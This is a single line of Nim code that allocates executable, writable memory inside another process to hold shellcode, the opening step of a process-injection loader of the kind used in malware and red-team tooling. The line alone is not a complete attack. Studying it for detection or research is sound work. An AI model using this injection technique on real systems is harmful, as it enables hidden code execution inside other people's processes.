let rPtr = VirtualAllocEx(pHandle, nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
